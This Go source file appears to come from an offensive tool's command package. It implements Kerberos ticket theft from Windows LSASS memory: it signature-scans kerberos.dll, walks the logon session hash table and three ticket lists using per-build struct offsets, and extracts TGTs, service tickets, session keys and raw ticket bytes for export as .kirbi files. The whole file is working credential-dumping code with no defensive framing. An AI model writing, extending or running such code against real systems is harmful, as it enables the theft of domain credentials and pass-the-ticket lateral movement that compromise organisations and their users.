package commands

// Kerberos ticket extraction from LSASS — walks kerberos.dll's internal
// KerbGlobalLogonSessionTable to extract TGTs and service tickets.
//
// This is architecturally separate from the credential chain in lsasrv.dll
// (lsass_credential_list.go). The credential chain holds NT hashes and Kerberos
// keys; tickets live in kerberos.dll's own session table.
//
// Pipeline:
//   1. Enumerate modules in LSASS, find kerberos.dll
//   2. Read kerberos.dll image from LSASS memory
//   3. Sigscan for KerbGlobalLogonSessionTable reference
//   4. Walk the Kerberos logon session list (LIST_ENTRY chain)
//   5. For each session, walk three ticket lists (TGT, service×2)
//   6. Extract ticket data: service name, times, flags, raw ticket bytes
//   7. Serialize to .kirbi format (KRB-CRED ASN.1 structure)

import (
	"encoding/binary"
	"fmt"
	"time"
	"unicode/utf16"
)

// ---------------------------------------------------------------------------
// Sigscan patterns for KerbGlobalLogonSessionTable
// ---------------------------------------------------------------------------

type kerbTableVariant struct {
	Name string
	// Signature is the hex pattern to find in kerberos.dll's .text section.
	// The RIP-relative displacement for the table address is located at
	// DispOffset bytes relative to the match start.
	Signature string
	// DispOffset is the offset from the match start to the 4-byte disp32 field.
	// Typically -4 (the displacement ends right where the pattern starts).
	DispOffset int
}

// kerbTableVariants lists sigscan patterns for KerbGlobalLogonSessionTable.
// The instruction before each pattern is a `lea rax, [rip+disp32]` (7 bytes)
// that loads the table address into rax. The disp32 ends right where the
// pattern starts (DispOffset = -4 means the 4-byte displacement field is
// at match_start - 4).
//
// All Windows 10/11/Server builds use the same core pattern: the compiler
// generates `mov rbx, [rax]` / `test rbx, rbx` / `jz` right after the lea.
// The pattern `48 8B 18 48 85 DB 74` (rbx variant) is consistent across
// Win10 1507 through Win11 24H2 per pypykatz and mimikatz.
//
// Since the 7-byte pattern can have false positive matches, findKerbSessionTable
// tries ALL matches (not just the first) and validates each resolved address.
var kerbTableVariants = []kerbTableVariant{
	{
		// Universal rbx variant: mov rbx, [rax] / test rbx, rbx / jz
		// Works across Win10 1507 through Win11 24H2 / Server 2016-2025.
		Name:       "Universal_rbx",
		Signature:  "48 8B 18 48 85 DB 74",
		DispOffset: -4,
	},
	{
		// Server 2019 cmp variant: cmp rcx, rax / jz (short)
		// On Server 2019 (build 17763), the compiler generates a circular
		// linked list termination check (cmp cursor, &head) instead of a
		// NULL check (test rbx, rbx). The lea rax, [rip+disp32] loads the
		// table address immediately before the cmp.
		Name:       "Server2019_cmp",
		Signature:  "48 3B C8 74",
		DispOffset: -4,
	},
	{
		// Same as above but with long jz (0F 84 xx xx xx xx).
		Name:       "Server2019_cmp_long",
		Signature:  "48 3B C8 0F 84",
		DispOffset: -4,
	},
}

// findKerbSessionTable scans a kerberos.dll image for the KerbGlobalLogonSessionTable
// address using signature patterns. Since the short pattern can match at
// multiple locations (false positives), ALL matches are tried and the resolved
// target is validated: it must fall within the module image AND the preceding
// 7 bytes must look like a plausible lea/mov RIP-relative instruction
// (REX.W prefix 0x48 or 0x4C at instruction start).
// Returns the LSASS-virtual address of the table head and the matched variant name.
func findKerbSessionTable(kerbDllBytes []byte, kerbDllBase uintptr) (uintptr, string, error) {
	var lastErr error
	for _, v := range kerbTableVariants {
		pat, mask, err := parseHexPattern(v.Signature)
		if err != nil {
			lastErr = fmt.Errorf("internal: bad signature %q: %w", v.Name, err)
			continue
		}
		hits := findAllPatterns(kerbDllBytes, pat, mask, 32)
		if len(hits) == 0 {
			continue
		}

		for _, hit := range hits {
			dispStart := hit + v.DispOffset
			if dispStart < 0 || dispStart+4 > len(kerbDllBytes) {
				continue
			}

			// Verify the preceding instruction looks like a REX.W lea/mov
			instrStart := dispStart - 3 // 7-byte instruction: REX(1) + opcode(1) + ModRM(1) + disp32(4)
			if instrStart < 0 {
				continue
			}
			prefix := kerbDllBytes[instrStart]
			if prefix != 0x48 && prefix != 0x4C {
				continue // not a REX.W prefix
			}
			opcode := kerbDllBytes[instrStart+1]
			if opcode != 0x8D && opcode != 0x8B {
				continue // not LEA (0x8D) or MOV (0x8B)
			}

			disp := int32(binary.LittleEndian.Uint32(kerbDllBytes[dispStart : dispStart+4]))
			targetOffset := hit + int(disp)
			if targetOffset < 0 || targetOffset >= len(kerbDllBytes) {
				continue
			}

			// Target should be in the data section (upper portion of the module)
			// Heuristic: target should be in the upper 75% of the module
			if targetOffset < len(kerbDllBytes)/4 {
				continue
			}

			return kerbDllBase + uintptr(targetOffset), v.Name, nil
		}
		lastErr = fmt.Errorf("variant %q: %d matches, none had valid target", v.Name, len(hits))
	}
	if lastErr != nil {
		return 0, "", fmt.Errorf("KerbGlobalLogonSessionTable: no variant matched in %d-byte kerberos.dll (last error: %w)", len(kerbDllBytes), lastErr)
	}
	return 0, "", fmt.Errorf("KerbGlobalLogonSessionTable: no variant matched in %d-byte kerberos.dll (%d variants tried)", len(kerbDllBytes), len(kerbTableVariants))
}

// ---------------------------------------------------------------------------
// Kerberos session struct layout
// ---------------------------------------------------------------------------

// kerbSessionLayout describes the field offsets within KIWI_KERBEROS_LOGON_SESSION
// for a specific Windows build range. The Kerberos session struct has the
// LIST_ENTRY at a non-zero offset (unlike LogonSessionList where it's at 0).
type kerbSessionLayout struct {
	Name           string
	ListEntryOff   int // offset of the LIST_ENTRY that links sessions
	LUIDOff        int // offset of LUID (8 bytes)
	UserNameOff    int // offset of credentials.UserName (LSA_UNICODE_STRING)
	DomainOff      int // offset of credentials.DomainName (LSA_UNICODE_STRING)
	Tickets1Off    int // offset of Tickets_1 LIST_ENTRY (TGTs)
	Tickets2Off    int // offset of Tickets_2 LIST_ENTRY (service tickets)
	Tickets3Off    int // offset of Tickets_3 LIST_ENTRY (service tickets)
	NodeReadSize   int // total bytes to read per session node
}

var kerbSessionLayouts = []kerbSessionLayout{
	{
		// Server 2019 (build 17763) / Win10 1809+ / Win11
		// All fields shift by +0x18 vs base 1607 layout. Ticket lists are
		// at 0xD8→0xF0, 0xF0→0x108, 0x108→0x120. Each ticket list is a
		// LIST_ENTRY (16 bytes) followed by a FILETIME (8 bytes), giving
		// 0x18 spacing between consecutive lists.
		Name:         "Win10_1809_Win11",
		ListEntryOff: 0x08,
		LUIDOff:      0x60,
		UserNameOff:  0xA0,
		DomainOff:    0xB0,
		Tickets1Off:  0xF0,
		Tickets2Off:  0x108,
		Tickets3Off:  0x120,
		NodeReadSize: 0x300,
	},
	{
		// Win10 1607-1803 / Server 2016 (KIWI_KERBEROS_LOGON_SESSION_10_1607)
		// Ticket lists at 0xD8/0xF0/0x108 with 0x18 spacing (LIST_ENTRY +
		// FILETIME between each).
		Name:         "Win10_1607",
		ListEntryOff: 0x08,
		LUIDOff:      0x48,
		UserNameOff:  0x88,
		DomainOff:    0x98,
		Tickets1Off:  0xD8,
		Tickets2Off:  0xF0,
		Tickets3Off:  0x108,
		NodeReadSize: 0x128,
	},
	{
		// Win10 1507-1511 (KIWI_KERBEROS_LOGON_SESSION_10)
		Name:         "Win10_1507",
		ListEntryOff: 0x08,
		LUIDOff:      0x48,
		UserNameOff:  0x70,
		DomainOff:    0x80,
		Tickets1Off:  0xD0,
		Tickets2Off:  0xE0,
		Tickets3Off:  0xF0,
		NodeReadSize: 0x108,
	},
}

// ---------------------------------------------------------------------------
// Kerberos ticket struct layout
// ---------------------------------------------------------------------------

// kerbTicketLayout describes the field offsets within KIWI_KERBEROS_INTERNAL_TICKET
// for a specific Windows build range.
type kerbTicketLayout struct {
	Name              string
	ServiceNameOff    int // PKERB_EXTERNAL_NAME pointer
	TargetNameOff     int // PKERB_EXTERNAL_NAME pointer
	DomainNameOff     int // LSA_UNICODE_STRING
	TargetDomainOff   int // LSA_UNICODE_STRING
	AltTargetDomOff   int // LSA_UNICODE_STRING
	ClientNameOff     int // PKERB_EXTERNAL_NAME pointer
	TicketFlagsOff    int // ULONG
	KeyTypeOff        int // ULONG
	KeyOff            int // KIWI_KERBEROS_BUFFER (Length + pad + Value)
	StartTimeOff      int // FILETIME
	EndTimeOff        int // FILETIME
	RenewUntilOff     int // FILETIME
	TicketEncTypeOff  int // ULONG
	TicketKvnoOff     int // ULONG
	TicketOff         int // KIWI_KERBEROS_BUFFER (raw ticket bytes)
	NodeReadSize      int // total bytes to read per ticket node
}

var kerbTicketLayouts = []kerbTicketLayout{
	{
		// Win10 1607+ / Server 2019 / Win11 (KIWI_KERBEROS_INTERNAL_TICKET_10_1607)
		Name:             "Win10_1607_Win11",
		ServiceNameOff:   0x20,
		TargetNameOff:    0x28,
		DomainNameOff:    0x30,
		TargetDomainOff:  0x40,
		AltTargetDomOff:  0x60,
		ClientNameOff:    0x70,
		TicketFlagsOff:   0x80,
		KeyTypeOff:       0x88,
		KeyOff:           0x90,
		StartTimeOff:     0xB8,
		EndTimeOff:       0xC0,
		RenewUntilOff:    0xC8,
		TicketEncTypeOff: 0xF4,
		TicketKvnoOff:    0xF8,
		TicketOff:        0x100,
		NodeReadSize:     0x110,
	},
	{
		// Win10 1507-1511 (KIWI_KERBEROS_INTERNAL_TICKET_6)
		Name:             "Win10_1507",
		ServiceNameOff:   0x20,
		TargetNameOff:    0x28,
		DomainNameOff:    0x30,
		TargetDomainOff:  0x40,
		AltTargetDomOff:  0x60,
		ClientNameOff:    0x70,
		TicketFlagsOff:   0x80,
		KeyTypeOff:       0x88,
		KeyOff:           0x90,
		StartTimeOff:     0xB0,
		EndTimeOff:       0xB8,
		RenewUntilOff:    0xC0,
		TicketEncTypeOff: 0xEC,
		TicketKvnoOff:    0xF0,
		TicketOff:        0xF8,
		NodeReadSize:     0x108,
	},
}

// ---------------------------------------------------------------------------
// Parsed output types
// ---------------------------------------------------------------------------

// kerbSession holds the parsed fields from a KIWI_KERBEROS_LOGON_SESSION node.
type kerbSession struct {
	Address  uintptr
	LUID     uint64
	UserName string
	Domain   string
	Raw      []byte // raw session buffer for ticket list extraction
	Tickets  []kerbTicket
}

// kerbTicket holds the parsed fields from a single Kerberos ticket entry.
type kerbTicket struct {
	ListIndex       int    // 1=TGT, 2=service, 3=service
	ServiceName     string // SPN (e.g., krbtgt/DOMAIN.COM)
	ClientName      string // client principal
	DomainName      string // realm
	TargetDomain    string // target realm
	AltTargetDomain string
	TicketFlags     uint32
	KeyType         uint32 // session key encryption type
	KeyBytes        []byte // session key
	StartTime       time.Time
	EndTime         time.Time
	RenewUntil      time.Time
	TicketEncType   uint32 // ticket encryption type
	TicketKvno      uint32 // key version number
	TicketBytes     []byte // raw ASN.1 Ticket (for kirbi export)
}

// kerbTicketFlagNames maps ticket flag bits to human-readable names.
var kerbTicketFlagNames = map[uint32]string{
	0x40000000: "forwardable",
	0x20000000: "forwarded",
	0x10000000: "proxiable",
	0x08000000: "proxy",
	0x04000000: "may-postdate",
	0x02000000: "postdated",
	0x01000000: "invalid",
	0x00800000: "renewable",
	0x00400000: "initial",
	0x00200000: "pre-authent",
	0x00100000: "hw-authent",
	0x00080000: "ok-as-delegate",
	0x00020000: "name-canonicalize",
}

func formatTicketFlags(flags uint32) string {
	var names []string
	for bit, name := range kerbTicketFlagNames {
		if flags&bit != 0 {
			names = append(names, name)
		}
	}
	if len(names) == 0 {
		return fmt.Sprintf("0x%08x", flags)
	}
	return fmt.Sprintf("0x%08x (%s)", flags, joinStrings(names, ", "))
}

func joinStrings(ss []string, sep string) string {
	if len(ss) == 0 {
		return ""
	}
	result := ss[0]
	for _, s := range ss[1:] {
		result += sep + s
	}
	return result
}

// ---------------------------------------------------------------------------
// Kerberos session list walker
// ---------------------------------------------------------------------------

// kerbHashTableSlots is the number of buckets in KerbGlobalLogonSessionTable.
// On Win10+, the table is a hash table (array of LIST_ENTRY heads), typically
// with 64 slots. Each slot is a separate linked list of sessions hashed by LUID.
const kerbHashTableSlots = 64

// walkKerbSessionList walks all slots of the KerbGlobalLogonSessionTable hash
// table and returns parsed session entries. tableBase is the LSASS-virtual
// address of the first LIST_ENTRY in the hash table array.
//
// On some builds, the table may be a single LIST_ENTRY (not a hash table).
// We auto-detect by checking if slots beyond 0 look like valid LIST_ENTRY
// heads (self-referencing for empty, or pointing to valid heap addresses).
func walkKerbSessionList(r lsassReader, tableBase uintptr, sessLayout kerbSessionLayout) ([]kerbSession, error) {
	if r == nil {
		return nil, fmt.Errorf("nil lsassReader")
	}
	if tableBase == 0 {
		return nil, fmt.Errorf("zero table base address")
	}

	// First, determine how many slots to walk. Read a batch of LIST_ENTRY
	// heads and check which ones look valid (self-referencing or heap pointers).
	maxSlots := detectHashTableSize(r, tableBase)

	sessions := make([]kerbSession, 0, 16)
	visited := make(map[uintptr]bool, 64)

	for slot := 0; slot < maxSlots; slot++ {
		slotAddr := tableBase + uintptr(slot*16)

		head, err := readListEntry(r, slotAddr)
		if err != nil {
			continue
		}
		if head.Flink == 0 || head.Flink == slotAddr {
			continue // empty slot
		}

		cursor := head.Flink
		for j := 0; j < 256; j++ {
			if cursor == slotAddr || cursor == 0 {
				break
			}
			if visited[cursor] {
				break
			}
			visited[cursor] = true

			sessionBase := cursor - uintptr(sessLayout.ListEntryOff)
			buf, err := r.Read(sessionBase, uint32(sessLayout.NodeReadSize))
			if err != nil {
				break
			}

			session := parseKerbSession(r, buf, sessionBase, sessLayout)

			// Skip entries with garbage LUID (high 32 bits set = likely an address).
			// Don't break — there may be valid entries after this one.
			if session.LUID>>32 != 0 {
				leOff := sessLayout.ListEntryOff
				flink := uintptr(binary.LittleEndian.Uint64(buf[leOff : leOff+8]))
				cursor = flink
				continue
			}

			session.Raw = buf
			sessions = append(sessions, session)

			leOff := sessLayout.ListEntryOff
			flink := uintptr(binary.LittleEndian.Uint64(buf[leOff : leOff+8]))
			cursor = flink
		}
	}

	return sessions, nil
}

// detectHashTableSize determines how many slots to walk by checking if
// the table entries look like valid LIST_ENTRY heads. A valid slot either
// self-references (empty) or points to a heap address (non-module).
func detectHashTableSize(r lsassReader, tableBase uintptr) int {
	// Read enough for 64 LIST_ENTRY heads (64 * 16 = 1024 bytes)
	raw, err := r.Read(tableBase, 1024)
	if err != nil {
		return 1 // fall back to single list
	}

	validSlots := 0
	for i := 0; i < kerbHashTableSlots; i++ {
		off := i * 16
		if off+16 > len(raw) {
			break
		}
		flink := uintptr(binary.LittleEndian.Uint64(raw[off : off+8]))
		blink := uintptr(binary.LittleEndian.Uint64(raw[off+8 : off+16]))
		slotAddr := tableBase + uintptr(off)

		// Valid patterns:
		// 1. Self-referencing (empty list): Flink == slotAddr && Blink == slotAddr
		// 2. Non-empty: Flink != slotAddr, and Blink should also != 0
		if flink == slotAddr && blink == slotAddr {
			validSlots++ // empty slot — valid
		} else if flink != 0 && blink != 0 && flink != slotAddr {
			validSlots++ // non-empty slot — valid
		}
	}

	if validSlots >= 32 {
		return kerbHashTableSlots // looks like a real hash table
	}
	return 1 // likely a single linked list
}

// parseKerbSession extracts fields from a raw Kerberos session buffer.
func parseKerbSession(r lsassReader, raw []byte, base uintptr, layout kerbSessionLayout) kerbSession {
	sess := kerbSession{Address: base}

	if layout.LUIDOff+8 <= len(raw) {
		sess.LUID = binary.LittleEndian.Uint64(raw[layout.LUIDOff : layout.LUIDOff+8])
	}

	if layout.UserNameOff+16 <= len(raw) {
		sess.UserName, _ = readRemoteLSAUnicodeString(r, raw[layout.UserNameOff:layout.UserNameOff+16])
	}
	if layout.DomainOff+16 <= len(raw) {
		sess.Domain, _ = readRemoteLSAUnicodeString(r, raw[layout.DomainOff:layout.DomainOff+16])
	}

	return sess
}

// readRemoteLSAUnicodeString parses a 16-byte LSA_UNICODE_STRING header and
// dereferences the Buffer pointer via the lsassReader to read the string.
func readRemoteLSAUnicodeString(r lsassReader, header []byte) (string, error) {
	if len(header) < 16 {
		return "", fmt.Errorf("header too short: %d bytes", len(header))
	}
	length := binary.LittleEndian.Uint16(header[0:2])
	bufAddr := uintptr(binary.LittleEndian.Uint64(header[8:16]))

	if length == 0 || bufAddr == 0 {
		return "", nil
	}
	if length > 1024 || length%2 != 0 {
		return "", fmt.Errorf("bad LSA_UNICODE_STRING length: %d", length)
	}

	raw, err := r.Read(bufAddr, uint32(length))
	if err != nil {
		return "", fmt.Errorf("read string at 0x%X: %w", bufAddr, err)
	}

	u16 := make([]uint16, length/2)
	for i := range u16 {
		u16[i] = binary.LittleEndian.Uint16(raw[i*2 : i*2+2])
	}
	return string(utf16.Decode(u16)), nil
}

// ---------------------------------------------------------------------------
// Ticket list walker
// ---------------------------------------------------------------------------

// walkKerbTicketList walks a single ticket list (Tickets_1, _2, or _3) and
// returns parsed ticket entries. listHeadAddr is the LSASS-virtual address of
// the LIST_ENTRY head within the session struct. listIndex is 1, 2, or 3.
func walkKerbTicketList(r lsassReader, listHeadAddr uintptr, listIndex int, ticketLayout kerbTicketLayout) ([]kerbTicket, error) {
	if r == nil || listHeadAddr == 0 {
		return nil, nil
	}

	head, err := readListEntry(r, listHeadAddr)
	if err != nil {
		return nil, fmt.Errorf("read ticket list %d head at 0x%X: %w", listIndex, listHeadAddr, err)
	}
	if head.Flink == 0 || head.Flink == listHeadAddr {
		return nil, nil // empty ticket list
	}

	tickets := make([]kerbTicket, 0, 4)
	cursor := head.Flink
	visited := make(map[uintptr]bool, 4)
	maxTickets := 256

	for i := 0; i < maxTickets; i++ {
		if cursor == listHeadAddr {
			break
		}
		if cursor == 0 {
			break
		}
		if visited[cursor] {
			break
		}
		visited[cursor] = true

		// For tickets, LIST_ENTRY is at offset 0 — cursor IS the ticket base
		buf, err := r.Read(cursor, uint32(ticketLayout.NodeReadSize))
		if err != nil {
			return tickets, fmt.Errorf("read ticket %d at 0x%X: %w", i, cursor, err)
		}

		ticket := parseKerbTicket(r, buf, cursor, listIndex, ticketLayout)
		tickets = append(tickets, ticket)

		// Follow Flink (at offset 0 of the ticket struct)
		flink := uintptr(binary.LittleEndian.Uint64(buf[0:8]))
		cursor = flink
	}

	return tickets, nil
}

// parseKerbTicket extracts fields from a raw Kerberos ticket buffer.
func parseKerbTicket(r lsassReader, raw []byte, base uintptr, listIndex int, layout kerbTicketLayout) kerbTicket {
	t := kerbTicket{ListIndex: listIndex}

	// Service name (PKERB_EXTERNAL_NAME pointer)
	if layout.ServiceNameOff+8 <= len(raw) {
		namePtr := uintptr(binary.LittleEndian.Uint64(raw[layout.ServiceNameOff : layout.ServiceNameOff+8]))
		t.ServiceName, _ = readKerbExternalName(r, namePtr)
	}

	// Client name
	if layout.ClientNameOff+8 <= len(raw) {
		namePtr := uintptr(binary.LittleEndian.Uint64(raw[layout.ClientNameOff : layout.ClientNameOff+8]))
		t.ClientName, _ = readKerbExternalName(r, namePtr)
	}

	// Domain names (LSA_UNICODE_STRING fields)
	if layout.DomainNameOff+16 <= len(raw) {
		t.DomainName, _ = readRemoteLSAUnicodeString(r, raw[layout.DomainNameOff:layout.DomainNameOff+16])
	}
	if layout.TargetDomainOff+16 <= len(raw) {
		t.TargetDomain, _ = readRemoteLSAUnicodeString(r, raw[layout.TargetDomainOff:layout.TargetDomainOff+16])
	}
	if layout.AltTargetDomOff+16 <= len(raw) {
		t.AltTargetDomain, _ = readRemoteLSAUnicodeString(r, raw[layout.AltTargetDomOff:layout.AltTargetDomOff+16])
	}

	// Ticket flags
	if layout.TicketFlagsOff+4 <= len(raw) {
		t.TicketFlags = binary.LittleEndian.Uint32(raw[layout.TicketFlagsOff : layout.TicketFlagsOff+4])
	}

	// Session key
	if layout.KeyTypeOff+4 <= len(raw) {
		t.KeyType = binary.LittleEndian.Uint32(raw[layout.KeyTypeOff : layout.KeyTypeOff+4])
	}
	if layout.KeyOff+16 <= len(raw) {
		t.KeyBytes, _ = readKerbBuffer(r, raw[layout.KeyOff:layout.KeyOff+16])
	}

	// Times (FILETIME = 100ns intervals since 1601-01-01)
	if layout.StartTimeOff+8 <= len(raw) {
		t.StartTime = kerbFiletimeToTime(binary.LittleEndian.Uint64(raw[layout.StartTimeOff : layout.StartTimeOff+8]))
	}
	if layout.EndTimeOff+8 <= len(raw) {
		t.EndTime = kerbFiletimeToTime(binary.LittleEndian.Uint64(raw[layout.EndTimeOff : layout.EndTimeOff+8]))
	}
	if layout.RenewUntilOff+8 <= len(raw) {
		t.RenewUntil = kerbFiletimeToTime(binary.LittleEndian.Uint64(raw[layout.RenewUntilOff : layout.RenewUntilOff+8]))
	}

	// Ticket encryption type and kvno
	if layout.TicketEncTypeOff+4 <= len(raw) {
		t.TicketEncType = binary.LittleEndian.Uint32(raw[layout.TicketEncTypeOff : layout.TicketEncTypeOff+4])
	}
	if layout.TicketKvnoOff+4 <= len(raw) {
		t.TicketKvno = binary.LittleEndian.Uint32(raw[layout.TicketKvnoOff : layout.TicketKvnoOff+4])
	}

	// Raw ticket bytes
	if layout.TicketOff+16 <= len(raw) {
		t.TicketBytes, _ = readKerbBuffer(r, raw[layout.TicketOff:layout.TicketOff+16])
	}

	return t
}

// readKerbExternalName reads a KERB_EXTERNAL_NAME structure from LSASS memory.
// Layout:
//
//	+0x00  NameType   (SHORT, 2 bytes)
//	+0x02  NameCount  (USHORT, 2 bytes)
//	+0x04  padding    (4 bytes)
//	+0x08  Names[]    (LSA_UNICODE_STRING array, 16 bytes each)
//
// Returns a "/" separated string of the name components.
func readKerbExternalName(r lsassReader, addr uintptr) (string, error) {
	if addr == 0 || r == nil {
		return "", nil
	}

	// Read header: NameType(2) + NameCount(2) + pad(4) = 8 bytes
	hdr, err := r.Read(addr, 8)
	if err != nil {
		return "", fmt.Errorf("read KERB_EXTERNAL_NAME header at 0x%X: %w", addr, err)
	}

	nameCount := binary.LittleEndian.Uint16(hdr[2:4])
	if nameCount == 0 || nameCount > 16 {
		return "", nil
	}

	// Read the Names array (nameCount × 16 bytes of LSA_UNICODE_STRING)
	namesSize := uint32(nameCount) * 16
	namesRaw, err := r.Read(addr+8, namesSize)
	if err != nil {
		return "", fmt.Errorf("read KERB_EXTERNAL_NAME names at 0x%X: %w", addr+8, err)
	}

	var result string
	for i := uint16(0); i < nameCount; i++ {
		off := int(i) * 16
		if off+16 > len(namesRaw) {
			break
		}
		part, _ := readRemoteLSAUnicodeString(r, namesRaw[off:off+16])
		if i > 0 {
			result += "/"
		}
		result += part
	}
	return result, nil
}

// readKerbBuffer reads a KIWI_KERBEROS_BUFFER (Length+pad+Value pointer) and
// dereferences the Value pointer to read the actual data.
// Layout:
//
//	+0x00  Length  (ULONG, 4 bytes)
//	+0x04  padding (4 bytes)
//	+0x08  Value   (PVOID, 8 bytes — pointer to data)
func readKerbBuffer(r lsassReader, header []byte) ([]byte, error) {
	if len(header) < 16 {
		return nil, fmt.Errorf("KIWI_KERBEROS_BUFFER header too short: %d bytes", len(header))
	}

	length := binary.LittleEndian.Uint32(header[0:4])
	valuePtr := uintptr(binary.LittleEndian.Uint64(header[8:16]))

	if length == 0 || valuePtr == 0 {
		return nil, nil
	}
	// Sanity: tickets can be up to ~8KB, keys up to 256 bytes
	if length > 16384 {
		return nil, fmt.Errorf("KIWI_KERBEROS_BUFFER length %d exceeds 16KB cap", length)
	}

	data, err := r.Read(valuePtr, length)
	if err != nil {
		return nil, fmt.Errorf("read kerberos buffer at 0x%X (len %d): %w", valuePtr, length, err)
	}
	return data, nil
}

// kerbFiletimeToTime converts a Windows FILETIME (100-nanosecond intervals
// since 1601-01-01) to a Go time.Time. Returns zero time for zero/invalid
// values. Uses uint64 input for raw binary parsing (unlike the int64 variant
// in forensics_helpers.go).
func kerbFiletimeToTime(ft uint64) time.Time {
	if ft == 0 || ft == 0x7FFFFFFFFFFFFFFF {
		return time.Time{}
	}
	const epochDiff = 116444736000000000
	if ft < epochDiff {
		return time.Time{}
	}
	nsec := (ft - epochDiff) * 100
	return time.Unix(0, int64(nsec)).UTC()
}

// ---------------------------------------------------------------------------
// Orchestrator: extract all tickets from a Kerberos session
// ---------------------------------------------------------------------------

// extractKerbTickets walks all three ticket lists in a session and returns
// the combined ticket list.
func extractKerbTickets(r lsassReader, sessionRaw []byte, sessionBase uintptr, sessLayout kerbSessionLayout, ticketLayout kerbTicketLayout) []kerbTicket {
	var allTickets []kerbTicket

	type ticketList struct {
		offset int
		index  int
	}
	lists := []ticketList{
		{sessLayout.Tickets1Off, 1},
		{sessLayout.Tickets2Off, 2},
		{sessLayout.Tickets3Off, 3},
	}

	for _, tl := range lists {
		if tl.offset+16 > len(sessionRaw) {
			continue
		}
		listHeadAddr := sessionBase + uintptr(tl.offset)
		tickets, _ := walkKerbTicketList(r, listHeadAddr, tl.index, ticketLayout)
		allTickets = append(allTickets, tickets...)
	}

	return allTickets
}

// selectKerbLayouts returns the best session and ticket layouts for the given
// Windows build number. Falls back to the newest layout if build is unknown (0).
func selectKerbLayouts(buildNumber uint32) (kerbSessionLayout, kerbTicketLayout) {
	if buildNumber > 0 && buildNumber < 14393 {
		return kerbSessionLayouts[2], kerbTicketLayouts[1] // Win10 1507
	}
	if buildNumber > 0 && buildNumber < 17763 {
		return kerbSessionLayouts[1], kerbTicketLayouts[0] // Win10 1607-1803
	}
	return kerbSessionLayouts[0], kerbTicketLayouts[0] // Server 2019+ / Win10 1809+ (default)
}

